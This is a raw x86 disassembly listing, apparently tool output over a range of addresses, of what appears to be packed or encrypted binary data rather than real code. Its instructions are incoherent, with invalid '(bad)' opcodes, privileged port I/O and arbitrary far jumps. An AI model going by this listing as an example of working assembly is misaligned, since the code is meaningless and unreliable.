  41fc3a:	and    eax,0x7ec43a34
  41fc3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc40:	test   eax,0xe60fe387
  41fc45:	xchg   esi,eax
  41fc46:	fwait
  41fc47:	xor    ah,dl
  41fc49:	add    DWORD PTR [eax],0xa2571a42
  41fc4f:	sar    ebp,cl
  41fc51:	fnsetpm(287 only) 
  41fc53:	fldenv [ecx-0x76]
  41fc56:	gs mov al,0x58
  41fc59:	xor    esi,esi
  41fc5b:	push   edx
  41fc5c:	jo     0x41fcb6
  41fc5e:	ja     0x41fcb3
  41fc60:	jg     0x41fc8e
  41fc62:	pop    ecx
  41fc63:	xchg   ebp,eax
  41fc64:	mov    eax,ds:0x29163705
  41fc69:	out    0x20,al
  41fc6b:	and    ebx,DWORD PTR [ecx]
  41fc6d:	mov    esp,ebp
  41fc6f:	push   esp
  41fc70:	in     al,dx
  41fc71:	ret    0xf173
  41fc74:	cmp    eax,0x846cc41
  41fc79:	push   ebx
  41fc7a:	or     eax,0xef218da
  41fc7f:	popa   
  41fc80:	mov    eax,0x5fdccf56
  41fc85:	iret   
  41fc86:	repz adc ecx,edi
  41fc89:	mov    edx,0x5f7beac5
  41fc8e:	lahf   
  41fc8f:	mov    ebx,0xa9f1c68f
  41fc94:	xchg   ebx,eax
  41fc95:	pop    edx
  41fc96:	add    al,0x9c
  41fc98:	addr16 pop edi
  41fc9a:	sti    
  41fc9b:	push   ds
  41fc9c:	cs jne 0x41fd12
  41fc9f:	sbb    BYTE PTR [eax+eiz*1+0x2fe01f2b],cl
  41fca6:	inc    esp
  41fca7:	int3   
  41fca8:	pop    eax
  41fca9:	adc    DWORD PTR [ebx-0x3f2c54b4],esi
  41fcaf:	in     al,0x1d
  41fcb1:	pushf  
  41fcb2:	sub    DWORD PTR [edx+ecx*2-0x186b629d],eax
  41fcb9:	pop    ss
  41fcba:	fimul  WORD PTR [esi-0x20]
  41fcbd:	push   0x76
  41fcbf:	fmul   QWORD PTR [ecx+eax*1]
  41fcc2:	inc    eax
  41fcc3:	cmp    ebx,DWORD PTR [esi+eiz*1+0x12]
  41fcc7:	lods   eax,DWORD PTR ds:[esi]
  41fcc8:	je     0x41fd39
  41fcca:	stos   DWORD PTR es:[edi],eax
  41fccb:	jmp    0x41fc7b
  41fccd:	in     al,dx
  41fcce:	gs mov eax,0x6991aed1
  41fcd4:	jo     0x41fc89
  41fcd6:	int3   
  41fcd7:	sub    ch,BYTE PTR ds:0x6baa8abc
  41fcdd:	ret    0x74b5
  41fce0:	add    DWORD PTR [edi+0x51],ebx
  41fce3:	cmp    DWORD PTR [esi-0x4dd81ffc],eax
  41fce9:	mov    eax,0x1bf5d5d8
  41fcee:	fist   WORD PTR [esi+eax*8-0x72]
  41fcf2:	test   al,0xb7
  41fcf4:	shr    BYTE PTR [edi],0x21
  41fcf7:	retf   0x3413
  41fcfa:	repnz call 0x3283:0xa6d37b4f
  41fd02:	sub    al,0xa0
  41fd04:	addr16 and al,0xc1
  41fd08:	inc    esp
  41fd09:	pop    ebx
  41fd0a:	js     0x41fd4d
  41fd0c:	jmp    0x0:0x16d9e2ef
	...
  41fd73:	add    BYTE PTR [edx+ebp*2],cl
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	bound  eax,QWORD PTR [esi-0x57]
  41fd83:	push   esp
  41fd84:	push   edi
  41fd85:	push   ebx
  41fd86:	add    DWORD PTR [eax],eax
  41fd88:	add    eax,0x7b000001
  41fd8d:	cwde   
  41fd8e:	and    bh,cl
  41fd90:	pusha  
  41fd91:	adc    BYTE PTR [ebp-0x2d],al
  41fd94:	xor    BYTE PTR fs:[ebp-0x8],al
  41fd98:	push   0x27
  41fd9a:	loope  0x41fe02
  41fd9c:	mov    eax,ds:0xa5c6b485
  41fda1:	push   ebx
  41fda2:	jmp    0x41fd82
  41fda4:	(bad)  
  41fda5:	loop   0x41fe01
  41fda7:	add    DWORD PTR [ecx],eax
  41fda9:	push   ss
  41fdaa:	ds xchg ebx,eax
  41fdac:	mov    esi,0x18df6311
  41fdb1:	popa   
  41fdb2:	mov    esi,0x7ddd5b63
  41fdb7:	push   ebp
  41fdb8:	adc    eax,0x68bbbc1e
  41fdbd:	mov    bl,0xf6
  41fdbf:	or     eax,0x3630bb15
  41fdc4:	mov    bl,0x4d
  41fdc6:	pop    esp
  41fdc7:	adc    DWORD PTR [ebp+0x39],0x4b
  41fdcb:	outs   dx,BYTE PTR ds:[esi]
  41fdcc:	test   BYTE PTR [eax],dh
  41fdce:	(bad)  
  41fdcf:	pop    esi
  41fdd0:	mov    eax,DWORD PTR [ebp+0x2ac46feb]
  41fdd6:	push   0x29
  41fdd8:	cmp    eax,0x21db3192
  41fddd:	jg     0x41fd84
  41fddf:	xor    ebx,edx
  41fde1:	pop    ds
  41fde2:	xchg   ebx,eax
  41fde3:	not    esi
  41fde5:	add    bl,cl
  41fde7:	repnz (bad) 
  41fde9:	sahf   
  41fdea:	add    ebx,DWORD PTR [ebx+0x4a]
  41fded:	xor    BYTE PTR [edi],ch
  41fdef:	call   DWORD PTR [edx-0x7e]
  41fdf2:	jns    0x41fe1c
  41fdf4:	dec    ebp
  41fdf5:	mov    eax,0xb59c33d1
  41fdfa:	push   ebx
  41fdfb:	pop    ecx
  41fdfc:	sti    
  41fdfd:	inc    ebx
  41fdfe:	in     eax,0x9d
  41fe00:	outs   dx,BYTE PTR ds:[esi]
  41fe01:	ja     0x41fe1c
  41fe03:	push   eax
  41fe04:	mov    ch,0x54
  41fe06:	retf   
  41fe07:	cs ret 
  41fe09:	lods   al,BYTE PTR ds:[esi]
  41fe0a:	test   al,0x11
  41fe0c:	pushf  
  41fe0d:	sbb    ecx,esp
  41fe0f:	int    0xe5
  41fe11:	imul   esp,DWORD PTR [esi],0xffffffce
  41fe14:	push   ebp
  41fe15:	test   eax,0xa4e9b83e
  41fe1a:	lahf   
  41fe1b:	sbb    BYTE PTR [ebx-0x72],ch
  41fe1e:	xor    dl,BYTE PTR [ebp-0x3d78a59d]
  41fe24:	arpl   WORD PTR [ecx],dx
  41fe26:	outs   dx,BYTE PTR ds:[esi]
  41fe27:	inc    ecx
  41fe28:	push   0xc55904e8
  41fe2d:	pop    ds
  41fe2e:	leave  
  41fe2f:	sti    
  41fe30:	jne    0x41fe2a
  41fe32:	mov    ecx,esp
  41fe34:	sbb    eax,0x4a78e763
  41fe39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe3a:	pop    ebp
  41fe3b:	jae    0x41fe72
  41fe3d:	sbb    al,BYTE PTR [ebp-0x3d199ab1]
  41fe43:	add    al,0xe1
  41fe45:	jo     0x41fde5
  41fe47:	bound  ebp,QWORD PTR [ebx-0x156c5c09]
  41fe4d:	sbb    al,0x3
  41fe4f:	inc    edi
  41fe50:	(bad)  
  41fe51:	lock push 0x32968c8e
  41fe57:	gs mov bh,cl
  41fe5a:	dec    esp
  41fe5b:	xor    BYTE PTR [ebp-0x10a4bb22],bl
  41fe61:	rcr    BYTE PTR [edi+0x45e0aba6],0x3b
  41fe68:	add    BYTE PTR [edi+edx*4-0x163a9e52],ah
  41fe6f:	inc    esp
  41fe70:	jb     0x41fe08
  41fe72:	xchg   edx,eax
  41fe73:	inc    ecx
  41fe74:	lea    edx,[esi]
  41fe76:	add    al,0xd0
  41fe78:	not    DWORD PTR [esi+0x5f]
  41fe7b:	inc    edi
  41fe7c:	pushf  
  41fe7d:	xchg   ecx,eax
  41fe7e:	fcmovnb st,st(2)
  41fe80:	inc    ebp
  41fe81:	loop   0x41fe6a
  41fe83:	inc    esp
  41fe84:	pop    ss
  41fe85:	loop   0x41fe9b
  41fe87:	mov    ecx,0x60cb46ac
  41fe8c:	sub    DWORD PTR [edi*1+0x247a],0x0
	...
  41fef3:	add    BYTE PTR [edx-0x1865ab],ch
  41fef9:	out    dx,eax
  41fefa:	call   FWORD PTR [ebp-0x5]
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0xe2
  41ff01:	mov    BYTE PTR [edi],cl
  41ff03:	or     DWORD PTR [esp+edx*2+0x1],ebx
  41ff07:	add    BYTE PTR ds:0x1e000001,al
  41ff0d:	xchg   ebp,eax
  41ff0e:	or     DWORD PTR [edx+0x3e],edi
  41ff11:	adc    ch,bl
  41ff13:	jae    0x41fef9
  41ff15:	int3   
  41ff16:	stc    
  41ff17:	lahf   
  41ff18:	push   ds
  41ff19:	or     DWORD PTR [edx],ebp
  41ff1b:	daa    
  41ff1c:	push   ss
  41ff1d:	repz push ss
  41ff1f:	cmp    ecx,edi
  41ff21:	push   ecx
  41ff22:	inc    eax
  41ff23:	(bad)  
  41ff24:	adc    eax,0xd956ed29
  41ff29:	jnp    0x41fece
  41ff2b:	cmp    BYTE PTR [edi-0xd],dh
  41ff2e:	mov    esi,0xc5c7126f
  41ff33:	les    esp,FWORD PTR [ebp-0x3a629050]
  41ff39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff3a:	in     al,0x90
  41ff3c:	mov    bl,0x26
  41ff3e:	fbld   TBYTE PTR [esi]
  41ff40:	jg     0x41ff60
  41ff42:	bound  esi,QWORD PTR [edx-0x28]
  41ff45:	pusha  
  41ff46:	ja     0x41ff06
  41ff48:	adc    BYTE PTR [ebp-0x11],al
  41ff4b:	aas    
  41ff4c:	push   ds
  41ff4d:	xor    edi,eax
  41ff4f:	fistp  QWORD PTR [esi+0xcb1acfe]
  41ff55:	mov    ch,0x4d
  41ff57:	ds sub eax,esp
  41ff5a:	or     ah,BYTE PTR [edx-0x7ff987bc]
  41ff60:	rcl    DWORD PTR [edi-0xc],0x62
  41ff64:	pushf  
  41ff65:	jne    0x41ff29
  41ff67:	in     al,dx
  41ff68:	mov    WORD PTR [ebp+0x70dfe471],?
  41ff6e:	add    eax,0x5778ddcf
  41ff73:	ins    BYTE PTR es:[edi],dx
  41ff74:	adc    DWORD PTR [esi],eax
  41ff76:	jmp    0x41ff03
  41ff78:	mov    bl,0x2b
  41ff7a:	sti    
  41ff7b:	push   ebp
  41ff7c:	mov    bh,0x6
  41ff7e:	fisub  WORD PTR [edi+0x18c8d33a]
  41ff84:	jmp    0xb746:0xff8d0344
  41ff8b:	and    BYTE PTR ds:0x5fbc599d,ah
  41ff91:	push   cs
  41ff92:	xchg   ebx,eax
  41ff93:	ret    
  41ff94:	adc    edi,ebx
  41ff96:	and    al,0xbb
  41ff98:	jl     0x41ffad
  41ff9a:	lea    edi,[edx+edi*1]
  41ff9d:	std    
  41ff9e:	mov    edi,DWORD PTR [edi+edx*1-0x2ec8410]
  41ffa5:	mov    bl,0x19
  41ffa7:	jecxz  0x41ff93
  41ffa9:	pop    es
  41ffaa:	xchg   ebx,eax
  41ffab:	lods   al,BYTE PTR ds:[esi]
  41ffac:	sbb    ecx,0xa2d7f70
  41ffb2:	sbb    cl,ch
  41ffb4:	iret   
  41ffb5:	mov    bh,0x43
  41ffb7:	xchg   ebp,eax
  41ffb8:	loop   0x420007
  41ffba:	add    esi,0x921b38e9
  41ffc0:	clc    
  41ffc1:	ins    BYTE PTR es:[edi],dx
  41ffc2:	call   0x64eb44f3
  41ffc7:	fsubr  DWORD PTR [ebx]
  41ffc9:	add    eax,0xd37c5606
  41ffce:	fnstenv [esi-0x75a5e859]
  41ffd4:	and    dl,BYTE PTR [eax+0x63]
  41ffd7:	or     edi,DWORD PTR [eax+0x60]
  41ffda:	sub    al,0xb1
  41ffdc:	jle    0x41ff8b
  41ffde:	push   0x54
  41ffe0:	out    dx,al
  41ffe1:	jp     0x41ffcc
  41ffe3:	mov    eax,ds:0x8f253918
  41ffe8:	pushf  
  41ffe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffea:	pop    es
  41ffeb:	imul   esi,DWORD PTR [edx],0x8fcf830
  41fff1:	mov    gs,WORD PTR [ecx-0x2ae4c2e7]
  41fff7:	mov    ebp,0xeb9b86fc
  41fffc:	cmp    ch,BYTE PTR [edi]
  41fffe:	dec    esi
  41ffff:	push   es
  420000:	outs   dx,DWORD PTR ds:[esi]
  420001:	xchg   DWORD PTR [eax+0x4c3af2f5],esi
  420007:	adc    BYTE PTR [eax+esi*4-0x7f],bl
  42000b:	clc    
  42000c:	jo     0x41ffd4
  42000e:	aad    0x5c
  420010:	ja     0x420012
	...
  420072:	add    BYTE PTR [eax],al
  420074:	bound  esp,QWORD PTR [ebp-0x8808a]
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0x5f
  420081:	in     al,0x79
  420083:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420084:	popa   
  420085:	push   ebp
  420086:	add    DWORD PTR [eax],eax
  420088:	add    eax,0x3000001
  42008d:	pushf  
  42008e:	jg     0x4200ba
  420090:	xchg   esi,eax
  420091:	das    
  420092:	outs   dx,BYTE PTR ds:[esi]
  420093:	xchg   edi,eax
  420094:	pop    esp
  420095:	ficom  DWORD PTR [eax]
  420097:	sbb    dl,bl
  420099:	ret    0x94a5
  42009c:	cld    
  42009d:	cmp    dh,cl
  42009f:	mov    edx,0x984672a0
  4200a4:	out    0xda,eax
  4200a6:	pop    ds
  4200a7:	sub    eax,0x37459d96
  4200ac:	jns    0x4200ca
  4200ae:	ret    0xd692
  4200b1:	jl     0x420131
  4200b3:	stos   BYTE PTR es:[edi],al
  4200b4:	fbstp  TBYTE PTR [edx]
  4200b6:	jae    0x42010b
  4200b8:	sub    edx,DWORD PTR [edi+0x33]
  4200bb:	mov    eax,ds:0x1d375d4a
  4200c0:	test   eax,0xe8cac072
  4200c5:	jl     0x420143
  4200c7:	mov    edx,DWORD PTR [edi-0x4f]
  4200ca:	pusha  
  4200cb:	sar    BYTE PTR [esi+edx*4],1
  4200ce:	mov    esi,0xa00a48df
  4200d3:	jns    0x420134
  4200d5:	retf   0xd5a5
  4200d8:	fwait
  4200d9:	jb     0x42008d
  4200db:	xchg   esi,eax
  4200dc:	jne    0x4200c1
  4200de:	pop    ss
  4200df:	int    0x46
  4200e1:	inc    edi
  4200e2:	dec    esi
  4200e3:	sbb    BYTE PTR [ecx+0x64266bd0],dl
  4200e9:	push   eax
  4200ea:	add    al,BYTE PTR [ebx-0x13ae201b]
  4200f0:	test   eax,0x23bb15a4
  4200f5:	mov    ecx,0x765ba416
  4200fa:	loopne 0x42011e
  4200fc:	sbb    DWORD PTR [esi+ecx*1+0x360ece61],ebp
  420103:	add    dh,BYTE PTR [eax-0x57]
  420106:	pop    ebx
  420107:	mov    cl,0x2f
  420109:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  42010b:	dec    esp
  42010c:	mul    DWORD PTR [ebp+0x61]
  42010f:	sub    cl,BYTE PTR [ecx-0x190e656c]
  420115:	mov    eax,ds:0x71f02f1b
  42011a:	pop    ecx
  42011b:	push   edx
  42011c:	cwde   
  42011d:	sub    DWORD PTR [esi+0x1e868d6d],0xf5b65168
  420127:	mov    dh,0x64
  420129:	pop    esi
  42012a:	mov    dh,0xc2
  42012c:	je     0x42017a
  42012e:	fiadd  WORD PTR [ebp-0x38]
  420131:	jnp    0x4200bf
  420133:	fmul   QWORD PTR [ebp+0xa]
  420136:	jg     0x42014f
  420138:	jmp    0x9035:0xf43c8e0d
  42013f:	pushf  
  420140:	jb     0x42016f
  420142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420143:	fnstenv [edx-0x18]
  420146:	je     0x4201c5
  420148:	lea    ebx,[esi]
  42014a:	scas   al,BYTE PTR es:[edi]
  42014b:	cmp    eax,0x223625d2
  420150:	mov    ds:0x1e26a204,al
  420155:	sbb    BYTE PTR [ebp-0x22408bb0],dh
  42015b:	ror    edx,cl
  42015d:	test   DWORD PTR [edi+0x11],eax
  420160:	push   0xe
  420162:	inc    ebp
  420163:	xor    esp,esp
  420165:	push   esp
  420166:	cmp    eax,0xcc89e2f
  42016b:	icebp  
  42016c:	xchg   edi,edi
  42016e:	jg     0x420181
  420170:	pusha  
  420171:	push   ebp
  420172:	icebp  
  420173:	inc    edx
  420174:	aad    0x8f
  420176:	or     al,0xf4
  420178:	fild   DWORD PTR [edx+eax*4]
  42017b:	iret   
  42017c:	pop    ebx
  42017d:	or     eax,0x8530ffed
  420182:	cs cli 
  420184:	sbb    eax,0x9ad56c87
  42018a:	aaa    
  42018b:	cmp    bl,bl
  42018d:	pusha  
  42018e:	enter  0x981f,0x0
	...
  4201f2:	add    BYTE PTR [eax],al
  4201f4:	jae    0x4201c5
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx-0x39f2bfea],1
  420204:	push   si
  420206:	add    DWORD PTR [eax],eax
  420208:	add    eax,0xe4000001
  42020d:	cmc    
  42020e:	sub    esp,DWORD PTR [edx]
  420210:	bound  ebx,QWORD PTR [ebx+esi*4]
  420213:	hlt    
  420214:	pushf  
  420215:	mov    ecx,0xaca1c454
  42021a:	clc    
  42021b:	jmp    0x8fa1:0xd9ea246b
  420222:	mov    ebp,0xce89ae68
  420227:	mov    edx,0xf4a664e6
  42022c:	cdq    
  42022d:	out    dx,eax
  42022e:	stos   DWORD PTR es:[edi],eax
  42022f:	test   al,0x38
  420231:	push   es
  420232:	outs   dx,DWORD PTR ds:[esi]
  420233:	push   0xffffffd5
  420235:	mov    ss,WORD PTR [esi-0x23196b41]
  42023b:	pop    eax
  42023c:	lock xor ecx,DWORD PTR [edi]
  42023f:	inc    ecx
  420240:	cdq    
  420241:	pop    esp
  420242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420243:	jnp    0x420296
  420245:	out    dx,al
  420246:	test   eax,0xe977aba8
  42024b:	sub    eax,0x753e6628
  420250:	push   ds
  420251:	inc    ebx
  420252:	sub    BYTE PTR ds:[edx-0x15],bh
  420256:	inc    ebx
  420257:	pushf  
  420258:	iret   
  420259:	xchg   ebp,eax
  42025a:	in     al,dx
  42025b:	daa    
  42025c:	jno    0x420279
  42025e:	adc    DWORD PTR [ecx+ebx*8+0x33],edx
  420262:	mov    ds:0x826619e1,al
  420267:	add    eax,0x4f86b24f
  42026c:	push   ebp
  42026d:	scas   eax,DWORD PTR es:[edi]
  42026e:	lahf   
  42026f:	pop    eax
  420270:	or     eax,0xc952350f
  420275:	xor    eax,0x6431f8b4
  42027a:	sbb    eax,DWORD PTR [edx-0x3]
  42027d:	gs pushf 
  42027f:	mov    dl,bl
  420281:	pop    ebx
  420282:	xchg   edi,eax
  420283:	mov    ah,0xf8
  420285:	xchg   ebp,eax
  420286:	adc    bl,cl
  420288:	mov    BYTE PTR [edi-0x10],bl
  42028b:	test   eax,0xa4d2e4e5
  420290:	outs   dx,DWORD PTR ds:[esi]
  420291:	addr16 push edx
  420293:	xor    eax,0x2d80e8af
  420298:	dec    ecx
  420299:	xchg   edx,eax
  42029a:	mov    ch,BYTE PTR [ebp-0x5a]
  42029d:	and    eax,DWORD PTR [ebp+0x67]
  4202a0:	cdq    
  4202a1:	cwde   
  4202a2:	jbe    0x42025e
  4202a4:	add    ah,BYTE PTR [ebx-0x6a3594a9]
  4202aa:	pusha  
  4202ab:	ret    0x6d90
  4202ae:	lods   eax,DWORD PTR ds:[esi]
  4202af:	aam    0x98
  4202b1:	rcl    WORD PTR [ecx+0x34],0xd8
  4202b6:	outs   dx,BYTE PTR ds:[esi]
  4202b7:	jg     0x420324
  4202b9:	sub    bl,BYTE PTR [ebp-0x5c]
  4202bc:	clc    
  4202bd:	sub    ebx,ecx
  4202bf:	out    0xbb,al
  4202c1:	lock xor BYTE PTR ds:0x2760af56,ch
  4202c8:	mov    edx,0x4827529d
  4202cd:	arpl   WORD PTR [ebx],bx
  4202cf:	cmp    eax,0xa35f4106
  4202d4:	cmp    DWORD PTR [ebp+0x6856455d],ebx
  4202da:	mov    ah,0x62
  4202dc:	mov    esi,0xa8018b2d
  4202e1:	sub    al,0xd8
  4202e3:	int    0x36
  4202e5:	mov    ebx,DWORD PTR [ecx-0x4665454c]
  4202eb:	or     eax,0xb11cefce
  4202f0:	mov    DWORD PTR [edi+0x2a],ebp
  4202f3:	xchg   BYTE PTR [esi+0x1b],dh
  4202f6:	mov    WORD PTR [ecx-0x15],?
  4202f9:	clc    
  4202fa:	pop    edi
  4202fb:	das    
  4202fc:	repnz repz icebp 
  4202ff:	push   ebp
  420300:	aas    
  420301:	ds push ebx
  420303:	dec    ecx
  420304:	fwait
  420305:	xchg   edi,eax
  420306:	ret    
  420307:	and    eax,0x963a87fe
  42030c:	scas   eax,DWORD PTR es:[edi]
  42030d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42030e:	sbb    BYTE PTR [ecx],ah
  420310:	outs   dx,DWORD PTR ds:[esi]
	...
  420371:	add    BYTE PTR [eax],al
  420373:	add    BYTE PTR [ecx+0x6],al
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	aam    0x11
  420382:	and    eax,0x1576b0f
  420387:	add    BYTE PTR ds:0xee000001,al
  42038d:	loope  0x42037d
  42038f:	and    eax,0xd52c520d
  420394:	mov    ds:0x96ff66ab,eax
  420399:	sbb    al,0x3b
  42039b:	jns    0x420413
  42039d:	jmp    0x84c1:0xda8a4436
  4203a4:	and    BYTE PTR [ebx+esi*2],0x9e
  4203a8:	add    ecx,DWORD PTR [edx-0x4f0b3a3f]
  4203ae:	sub    ebx,DWORD PTR [ecx-0x1e]
  4203b1:	sbb    DWORD PTR [ebx-0x596ec91],esp
  4203b7:	dec    edi
  4203b8:	rcr    DWORD PTR [eax-0x3d],1
  4203bb:	pop    ebx
  4203bc:	ins    BYTE PTR es:[edi],dx
  4203bd:	inc    ecx
  4203be:	mov    ?,edx
  4203c0:	icebp  
  4203c1:	xchg   ecx,eax
  4203c2:	mov    al,0x3c
  4203c4:	data16 js 0x4203e9
  4203c7:	push   ss
  4203c8:	retf   0x704c
  4203cb:	mov    al,ds:0x25a6cd28
  4203d0:	dec    ecx
  4203d1:	and    al,0x6c
  4203d3:	test   al,al
  4203d5:	or     BYTE PTR [ebp-0x7325a810],bh
  4203db:	mov    eax,0xc611233e
  4203e0:	cmp    eax,0xe693bad5
  4203e5:	(bad)  
  4203e6:	loop   0x42042b
  4203e8:	adc    eax,0xe28ff436
  4203ed:	call   0xf501c444
  4203f2:	push   edx
  4203f3:	mov    ds:0xfae9edec,eax
  4203f8:	es cmp eax,0x8362a254
  4203fe:	or     ah,bh
  420400:	adc    DWORD PTR [eax+edi*2-0x6f25c41a],esi
  420407:	into   
  420408:	pop    esp
  420409:	shl    BYTE PTR ds:0xd784a7d1,cl
  42040f:	ficom  DWORD PTR [edx-0x71]
  420412:	aam    0x9c
  420414:	mov    al,0x9b
  420416:	call   0x29b3:0x3d2c1114
  42041d:	jecxz  0x4203bb
  42041f:	addr16 fdivr st,st(4)
  420422:	enter  0x6cb9,0x46
  420426:	aam    0x55
  420428:	push   ebp
  420429:	lds    ecx,FWORD PTR [edx+0x1e26c83]
  42042f:	rcl    edx,cl
  420431:	ror    DWORD PTR [edi+0xd],1
  420434:	call   0x283db552
  420439:	nop
  42043a:	int3   
  42043b:	stos   BYTE PTR es:[edi],al
  42043c:	loope  0x420400
  42043e:	ficomp WORD PTR ds:0x4d9095a0
  420444:	repnz (bad) 
  420446:	mov    bh,bh
  420448:	jp     0x42043f
  42044a:	jo     0x4204a2
  42044c:	sahf   
  42044d:	xchg   esp,eax
  42044e:	jge    0x4203f7
  420450:	push   edi
  420451:	ja     0x42048a
  420453:	inc    ebp
  420454:	mov    al,0x93
  420456:	ja     0x420492
  420458:	sbb    al,0x21
  42045a:	or     DWORD PTR gs:[ebx+0x4b],eax
  42045e:	sub    esp,DWORD PTR [esi]
  420460:	clc    
  420461:	loope  0x4204c3
  420463:	mov    dl,0xe0
  420465:	in     eax,dx
  420466:	jb     0x420455
  420468:	mov    dl,0xdb
  42046a:	(bad)  
  42046b:	xchg   DWORD PTR ds:[ebx+esi*8-0x43],eax
  420470:	jns    0x420422
  420472:	aad    0xbb
  420474:	into   
  420475:	adc    ah,BYTE PTR [ecx]
  420477:	jge    0x420498
  420479:	push   ss
  42047a:	xchg   ecx,eax
  42047b:	mov    edi,0xf1664844
  420480:	icebp  
  420481:	add    BYTE PTR ds:0x131b6b28,0x56
  420488:	mov    edx,0xd8bdb2b7
  42048d:	xor    BYTE PTR [eax],ah
  42048f:	push   esp
  420490:	lods   eax,DWORD PTR ds:[esi]
	...
  4204f1:	add    BYTE PTR [eax],al
  4204f3:	add    BYTE PTR [esi+0x7f125794],ch
  4204f9:	shr    edi,cl
  4204fb:	mov    esp,0x5a7f6c39
  420500:	aad    0x1b
  420502:	dec    ebp
  420503:	(bad)  
  420504:	jo     0x42055e
  420506:	add    DWORD PTR [eax],eax
  420508:	add    eax,0xf2000001
  42050d:	cmp    eax,0x322e691d
  420512:	imul   edi,DWORD PTR [esi-0x3],0x11b7c54f
  420519:	xchg   ebx,eax
  42051a:	sub    DWORD PTR [esi],ecx
  42051c:	aad    0xb
  42051e:	or     cl,BYTE PTR [esi-0x554e24f7]
  420524:	push   ds
  420525:	xor    DWORD PTR gs:[edx],esp
  420528:	xor    eax,0x57cf4d00
  42052d:	pop    esp
  42052e:	mov    ds:0xb94d017,eax
  420533:	dec    ebx
  420534:	pop    esp
  420535:	icebp  
  420536:	in     al,0xd0
  420538:	jg     0x42053b
  42053a:	pop    ss
  42053b:	sub    eax,0x1954ce34
  420540:	add    eax,0x4b03b6e5
  420545:	mov    ch,0xeb
  420547:	test   al,0xfa
  420549:	test   BYTE PTR [eax+0x223266ba],dh
  42054f:	outs   dx,BYTE PTR ds:[esi]
  420550:	mov    dl,0x70
  420552:	mov    bh,0x2a
  420554:	test   eax,0x242bd9e9
  420559:	push   eax
  42055a:	sbb    DWORD PTR [eax+eiz*1],esp
  42055d:	adc    DWORD PTR [ebp+ebx*2-0xb832741],esi
  420564:	nop
  420565:	in     al,dx
  420566:	xchg   ah,al
  420568:	mov    bl,0x8
  42056a:	in     al,dx
  42056b:	fmul   QWORD PTR [ecx+0x155c309f]
  420571:	and    dl,bh
  420573:	in     al,dx
  420574:	int3   
  420575:	aad    0x80
  420577:	xchg   cl,al
  420579:	fimul  DWORD PTR [ebp+0x36]
  42057c:	std    
  42057d:	push   edx
  42057e:	jne    0x420548
  420580:	and    BYTE PTR [esp-0x21],bl
  420584:	retf   0xa269
  420587:	retf   
  420588:	imul   eax,DWORD PTR [edx-0x5aed35af],0xffffffd4
  42058f:	mov    al,ds:0xb6db58a7
  420594:	jb     0x42056f
  420596:	dec    ebx
  420597:	pop    esi
  420598:	sbb    al,0xf2
  42059a:	call   esp
  42059c:	cmp    eax,0x9ddcba2f
  4205a1:	loop   0x420545
  4205a3:	shr    BYTE PTR [edi+0x40],cl
  4205a6:	sbb    DWORD PTR [edx-0x3b],ebx
  4205a9:	mov    bl,dh
  4205ab:	in     eax,0x9c
  4205ad:	mov    ebp,0x76cc23ac
  4205b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205b3:	(bad)  
  4205b4:	xchg   edi,eax
  4205b5:	ins    DWORD PTR es:[edi],dx
  4205b6:	les    esp,FWORD PTR [ebx]
  4205b8:	shl    BYTE PTR [esi+0x7704142a],cl
  4205be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205bf:	fisttp QWORD PTR [ecx+0x73bbd75f]
  4205c5:	ror    WORD PTR [edi-0x69339d4],0x5d
  4205cd:	rcr    DWORD PTR [esi],1
  4205cf:	mov    eax,ds:0xae9380c0
  4205d4:	inc    esi
  4205d5:	inc    esp
  4205d6:	retf   0xb687
  4205d9:	cmp    ch,ch
  4205db:	add    eax,0x54b1a48d
  4205e0:	sbb    bh,BYTE PTR [ecx+0x35]
  4205e3:	pop    edi
  4205e4:	inc    ebp
  4205e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205e6:	fs test al,0x70
  4205e9:	mov    al,0x9a
  4205eb:	or     BYTE PTR es:[edx],bl
  4205ee:	mov    edi,0xf631717f
  4205f3:	je     0x42061b
  4205f5:	add    DWORD PTR [ebp-0x4986a992],ebp
  4205fb:	jmp    0x4205be
  4205fd:	fmul   DWORD PTR [ebx+0x5a7c96e1]
  420603:	imul   ebx,DWORD PTR [edi-0x52],0x165ef85c
  42060a:	add    esi,0x3c
  42060d:	push   0xfffffffb
  42060f:	cld    
  420610:	das    
	...
  420671:	add    BYTE PTR [eax],al
  420673:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42067a:	mov    ah,0xec
  42067c:	lds    eax,FWORD PTR [eax]
  42067e:	aad    0x78
  420680:	and    DWORD PTR [esi+0x5975ba84],0x1
  420687:	add    BYTE PTR ds:0xeb000001,al
  42068d:	push   cs
  42068e:	pushf  
  42068f:	xor    dl,BYTE PTR [edi-0x64f8ef83]
  420695:	adc    al,0x34
  420697:	mov    ebx,0xfd71e54b
  42069c:	mov    eax,ds:0x2b7f1107
  4206a1:	loopne 0x420663
  4206a3:	(bad)  
  4206a4:	aas    
  4206a5:	and    DWORD PTR ds:0x885df138,0x76f610d7
  4206af:	add    ch,ch
  4206b1:	aas    
  4206b2:	bound  ecx,QWORD PTR [eax+0x4d]
  4206b5:	xor    eax,0xbd71c289
  4206ba:	retf   0xc986
  4206bd:	out    0xdc,eax
  4206bf:	push   edi
  4206c0:	rcr    bl,1
  4206c2:	cs sbb ah,cl
